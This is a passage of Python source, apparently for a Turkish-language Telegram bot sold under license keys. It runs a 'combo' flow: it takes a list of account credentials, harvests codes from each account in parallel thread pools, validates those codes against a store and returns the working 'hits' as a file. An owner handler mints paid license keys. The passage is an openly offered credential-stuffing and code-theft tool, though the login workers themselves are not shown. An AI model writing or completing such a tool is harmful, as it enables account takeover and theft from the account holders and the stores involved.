        await message.answer("❌ Geçerli hesap listesi bulunamadı.", parse_mode=ParseMode.HTML)
        return await state.clear()
        
    progress_msg = await message.answer("🔄 <b>[Aşama 1/2] Kod Toplama İşlemi Başlatıldı...</b>", parse_mode=ParseMode.HTML)
    
    # Step 1: Fetch
    with results_lock:
        stats["total_accounts"] = len(valid_accounts)
        stats["processed_accounts"] = 0
        stats["good_accounts"] = 0
        stats["bad_accounts"] = 0
        stats["total_fetched_codes"] = 0
        stats["unique_fetched_codes"] = 0
        stats["start_time"] = time.time()
        stats["current_op"] = "Fetch"
        
    reporter_task = asyncio.create_task(live_tg_reporter(progress_msg, len(valid_accounts), "fetch"))
    collected_tokens = []
    fetch_threads = min(CONFIG["fetch_threads"], CONFIG["max_threads"])
    
    def run_fetch_pool():
        with ThreadPoolExecutor(max_workers=fetch_threads) as executor:
            futures = {executor.submit(process_account_worker, acc): acc for acc in valid_accounts}
            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    for c in res:
                        if c not in collected_tokens:
                            collected_tokens.append(c)
                    with results_lock:
                        stats["unique_fetched_codes"] = len(collected_tokens)
                        
    await asyncio.to_thread(run_fetch_pool)
    reporter_task.cancel()
    
    if not collected_tokens:
        await progress_msg.edit_text("⚠️ Kombodan hiçbir kod toplanamadı. Entegrasyon akışı durduruldu.")
        return await state.clear()
        
    # Step 2: Validate Automatically
    await progress_msg.edit_text(f"🔍 <b>[Aşama 2/2] Toplanan {len(collected_tokens)} Kod Otomatik Kontrol Ediliyor...</b>", parse_mode=ParseMode.HTML)
    
    with results_lock:
        stats["total_codes_to_validate"] = len(collected_tokens)
        stats["processed_codes"] = 0
        stats["valid_codes"] = 0
        stats["redeemed_codes"] = 0
        stats["invalid_codes"] = 0
        stats["error_codes"] = 0
        stats["rate_limited_codes"] = 0
        stats["start_time"] = time.time()
        stats["current_op"] = "Validate"
        
    reporter_task = asyncio.create_task(live_tg_reporter(progress_msg, len(collected_tokens), "validate"))
    
    store_state = {"tracking_id": uuid.uuid4().hex}
    auth_token = "MOCK_TOKEN_UPSTREAM_SECURE_" + "".join(random.choices(string.ascii_letters + string.digits, k=32))
    val_threads = min(CONFIG["validate_threads"], CONFIG["max_threads"])
    local_results = {"valid": [], "redeemed": [], "invalid": [], "error": []}
    
    def run_val_pool():
        with ThreadPoolExecutor(max_workers=val_threads) as executor:
            futures = {executor.submit(validate_single_code_worker, code, store_state, auth_token): code for code in collected_tokens}
            for fut in as_completed(futures):
                status, code, details = fut.result()
                local_results[status].append((code, details))
                
    await asyncio.to_thread(run_val_pool)
    reporter_task.cancel()
    await state.clear()
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    if local_results["valid"]:
        v_name = f"combo_valid_{timestamp}.txt"
        with open(v_name, "w", encoding="utf-8") as f:
            for code, game in local_results["valid"]:
                f.write(f"{code} | {game}\n")
        await message.answer_document(types.FSInputFile(v_name), caption=f"🎉 Combo Flow Başarıyla Tamamlandı! ({len(local_results['valid'])} Hit)")
        try:
            os.remove(v_name)
        except:
            pass
            
    await progress_msg.edit_text(f"🏁 <b>Combo Flow Tamamlandı!</b>\n\n• Toplam Toplanan Kod: {len(collected_tokens)}\n• Aktif Geçerli (Hit): <b>{len(local_results['valid'])}</b>\n• Kullanılmış: {len(local_results['redeemed'])}", parse_mode=ParseMode.HTML)

@dp.message(BotStates.ADMIN_GENERATE_KEY)
async def process_admin_key(message: types.Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return
    try:
        days = int(message.text.strip())
        key = "TURBO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
        db["generated_keys"][key] = days
        save_db(db)
        await state.clear()
        await message.answer(f"🔑 <b>Lisans Anahtarı Üretildi:</b>\n<code>{key}</code> ({days} Günlük)", parse_mode=ParseMode.HTML)
    except:
        await message.answer("❌ Geçersiz gün sayısı.")

# ============================================================================
# BOT ENGINE INITIALIZATION ENTRYPOINT
# ============================================================================
if __name__ == '__main__':
    logger.info("Starting Telegram Core Async Engine...")
    asyncio.run(dp.start_polling(bot))

